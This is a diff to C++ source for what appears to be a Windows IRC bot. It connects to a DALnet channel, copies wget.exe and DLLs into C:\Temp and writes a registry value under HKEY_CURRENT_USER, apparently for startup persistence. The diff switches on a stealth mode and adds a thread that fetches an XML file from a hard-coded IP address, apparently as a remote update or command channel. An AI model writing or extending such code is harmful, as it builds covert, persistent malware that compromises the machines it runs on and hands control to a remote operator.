@@ -25,6 +25,14 @@
 #include <sstream>
 #define nln "\n"
 
+#include <cstdlib>
+#include <pthread.h>
+
+#define NUM_THREADS     1
+
+
+#include <rapidxml_utils.hpp>
+#include <rapidxml_print.hpp>
 
 
 using boost::asio::ip::tcp;
@@ -33,6 +41,9 @@ using boost::asio::ip::tcp;
 using namespace dlib;
 using namespace std;
 #endif
+
+
+
 
 #ifdef D_LIB
 logger logcmd("cmd");
@@ -44,6 +55,8 @@ logger logircConnect("ircConnect");
 logger logmain("main");
 logger logSplitfilename("Splitfilename");
 logger logStealth("Stealth");
+logger logThread("Threading");
+logger logStartupKey("StartupKey");
 #endif
 
 
@@ -281,6 +294,8 @@ void setup_loggers (int level)
         logmain.set_level(LFATAL);
         logSplitfilename.set_level(LFATAL);
         logStealth.set_level(LFATAL);
+        logThread.set_level(LFATAL);
+        logStartupKey.set_level(LFATAL);
 
     }
 
@@ -295,6 +310,8 @@ void setup_loggers (int level)
         logmain.set_level(LWARN);
         logSplitfilename.set_level(LWARN);
         logStealth.set_level(LWARN);
+        logThread.set_level(LWARN);
+        logStartupKey.set_level(LWARN);
 
     }
     else if (level==2)
@@ -308,6 +325,8 @@ void setup_loggers (int level)
         logmain.set_level(LINFO);
         logSplitfilename.set_level(LINFO);
         logStealth.set_level(LINFO);
+        logThread.set_level(LINFO);
+        logStartupKey.set_level(LINFO);
     }
         else if (level==3)
     {
@@ -320,6 +339,8 @@ void setup_loggers (int level)
         logmain.set_level(LDEBUG);
         logSplitfilename.set_level(LDEBUG);
         logStealth.set_level(LDEBUG);
+        logThread.set_level(LDEBUG);
+        logStartupKey.set_level(LDEBUG);
     }
         else if (level==4)
     {
@@ -332,6 +353,8 @@ void setup_loggers (int level)
         logmain.set_level(LTRACE);
         logSplitfilename.set_level(LTRACE);
         logStealth.set_level(LTRACE);
+        logThread.set_level(LTRACE);
+        logStartupKey.set_level(LTRACE);
     }
         else if (level==5)
     {
@@ -344,6 +367,8 @@ void setup_loggers (int level)
         logmain.set_level(LALL);
         logSplitfilename.set_level(LALL);
         logStealth.set_level(LALL);
+        logThread.set_level(LALL);
+        logStartupKey.set_level(LALL);
     }
     if (level>=6)
     {
@@ -629,6 +654,7 @@ if (RegOpenKey(HKEY_CURRENT_USER,
     &newValue) != ERROR_SUCCESS)
 {
     cout<<"Failure in regedit"<<endl;
+    logStartupKey<<LFATAL << "Error:unable to create thread,";
 }
 DWORD pathLenInBytes = pathLen * sizeof(*szPath);
 if (RegSetValueEx(newValue,
@@ -639,16 +665,173 @@ if (RegSetValueEx(newValue,
     pathLenInBytes) != ERROR_SUCCESS)
 {
     RegCloseKey(newValue);
-    cout<<"Failure in closing regedit"<<endl;
+    logStartupKey<<LDEBUG<<"Failure in closing regedit";
 }
 RegCloseKey(newValue);
-cout<<"Failure in closing regedit"<<endl;
 
 
 }
 
+int xmlparser(char* filename)
+{
 
 
+ifstream myfile(filename);
+
+using namespace rapidxml;
+using namespace std;
+
+rapidxml::xml_document<> doc;
+
+/* "Read file into vector<char>" See linked thread above*/
+std::vector<char> buffer((istreambuf_iterator<char>(myfile)), istreambuf_iterator<char>( ));
+
+buffer.push_back('\0');
+
+//cout<<&buffer[0]<<endl; /*test the buffer */
+doc.parse<parse_declaration_node | parse_no_data_nodes>(&buffer[0]);
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+string encoding = doc.first_node()->first_attribute("encoding")->value();
+// encoding == "utf-8"
+
+// we didn't keep track of our previous traversal, so let's start again
+// we can match nodes by name, skipping the xml declaration entirely
+xml_node<>* cur_node = doc.first_node("rootnode");
+string rootnode_type = cur_node->first_attribute("type")->value();
+// rootnode_type == "example"
+
+// go straight to the first evendeepernode
+cur_node = cur_node->first_node("childnode")->first_node("evendeepernode");
+string attr2 = cur_node->first_attribute("attr2")->value();
+// attr2 == "dog"
+
+// and then to the second evendeepernode
+cur_node = cur_node->next_sibling("evendeepernode");
+attr2 = cur_node->first_attribute("attr2")->value();
+
+
+
+
+cout<< encoding<<endl;
+cout<<rootnode_type<<endl;
+cout<<attr2<<endl;
+
+return 0;
+}
+void *Check_Updates(void *threadid)
+{
+   long tid;
+   tid = (long)threadid;
+   logThread<<LDEBUG <<  "Started Update checker";
+
+   ///////////////////////////////////////////////////////
+
+using namespace rapidxml;
+string Host="54.69.156.193";
+string Get_Request="/current.xml";
+
+
+boost::asio::io_service io_service;
+
+// Get a list of endpoints corresponding to the server name.
+tcp::resolver resolver(io_service);
+tcp::resolver::query query(Host, "http");
+tcp::resolver::iterator endpoint_iterator = resolver.resolve(query);
+tcp::resolver::iterator end;
+
+// Try each endpoint until we successfully establish a connection.
+tcp::socket socket(io_service);
+boost::system::error_code error = boost::asio::error::host_not_found;
+while (error && endpoint_iterator != end)
+{
+socket.close();
+socket.connect(*endpoint_iterator++, error);
+}
+if (error)
+throw boost::system::system_error(error);
+
+// Form the request. We specify the "Connection: close" header so that the
+// server will close the socket after transmitting the response. This will
+// allow us to treat all data up until the EOF as the content.
+boost::asio::streambuf request;
+std::ostream request_stream(&request);
+
+request_stream << "GET " << Get_Request << " HTTP/1.0\r\n";
+request_stream << "Host: " << Host << "\r\n";
+request_stream << "Accept: */*\r\n";
+request_stream << "Connection: close\r\n\r\n";
+
+// Send the request.
+boost::asio::write(socket, request);
+
+// Read the response status line. The response streambuf will automatically
+// grow to accommodate the entire line. The growth may be limited by passing
+// a maximum size to the streambuf constructor.
+boost::asio::streambuf response;
+boost::asio::read_until(socket, response, "\r\n");
+
+// Check that response is OK.
+std::istream response_stream(&response);
+std::string http_version;
+response_stream >> http_version;
+unsigned int status_code;
+response_stream >> status_code;
+std::string status_message;
+std::getline(response_stream, status_message);
+if (!response_stream || http_version.substr(0, 5) != "HTTP/")
+{
+std::cout << "Invalid response\n";
+}
+if (status_code != 200)
+{
+std::cout << "Response returned with status code " << status_code << "\n";
+
+}
+
+// Read the response headers, which are terminated by a blank line.
+boost::asio::read_until(socket, response, "\r\n\r\n");
+
+// Process the response headers.
+std::string header;
+while (std::getline(response_stream, header) && header != "\r")
+std::cout << header << "\n";
+std::cout << "\n";
+
+// Write whatever content we already have to output.
+/**
+if (response.size() > 0)
+std::cout << &response;
+**/
+// Read until EOF, writing data to output as we go.
+while (boost::asio::read(socket, response,
+boost::asio::transfer_at_least(1), error))
+//std::cout << &response;
+;
+
+std::string response_final,final_data;
+std::istream response_data(&response);
+
+while(response_stream.good())
+{
+std::getline(response_stream, response_final);
+final_data+= (response_final+"\n");
+response_final.clear();
+}
+//std::cout<<final_data;
+ofstream write("somefile.xml");
+write<<final_data;
+write.close();
+
+if (error != boost::asio::error::eof)
+throw boost::system::system_error(error);
+
+xmlparser("somefile.xml");
+   ////////////////////////////////////////////////////////
+
+
+
+   pthread_exit(NULL);
+}
 
 
 
@@ -658,7 +841,7 @@ int main(int argc, char *argv[])
 std::ofstream os("logger.txt", std::ios_base::out);
 set_all_logging_output_streams (os);
 #endif // D_LIB
-Verbose(1);
+Verbose(5);
 #ifdef D_LIB
 logmain<<LINFO <<"Started";
 #endif // D_LIB
@@ -675,7 +858,7 @@ HOST=("punch.wa.us.dal.net"),channel="kens";
             FileCopier("libgcc_s_dw2-1.dll","libgcc_s_dw2-1.dll","C:\\Temp\\");
             FileCopier("libstdc++-6.dll","libstdc++-6.dll","C:\\Temp\\");
             FileCopier("wget.exe","wget.exe","C:\\Temp\\");
-            //FileCopier("libhogweed-2-1.dll","libhogweed-2-1.dll","C:\\Temp\\");
+            FileCopier("pthreadGC2.dll","pthreadGC2.dll","C:\\Temp\\");
             //FileCopier("libidn-11.dll","libidn-11.dll","C:\\Temp\\");
             //FileCopier("libintl-8.dll","libintl-8.dll","C:\\Temp\\");
             //FileCopier("libnettle-4-3.dll","libnettle-4-3.dll","C:\\Temp\\");
@@ -685,9 +868,22 @@ HOST=("punch.wa.us.dal.net"),channel="kens";
             //FileCopier("libiconv-2.dll","libiconv-2.dll","C:\\Temp\\");
         }
 start_reg();
-system("taskkill /f /im Communication.exe");
+//system("taskkill /f /im Communication.exe");
 system("del Communication.exe");
-    Stealth(0);
+    Stealth(1);
+///////////////////////////////Multi-threading/////////////////////////////////
+pthread_t threads[NUM_THREADS];
+int rc;
+int i=1;
+
+ std::cout << "main() : creating thread, " << i << endl;
+      rc = pthread_create(&threads[i], NULL,
+                          Check_Updates, (void *)i);
+      if (rc){
+        logmain<<LFATAL << "Error:unable to create thread," << rc ;
+      }
+///////////////////////////////Multi-threading/////////////////////////////////
+
     Compname();
     while (1)
             {
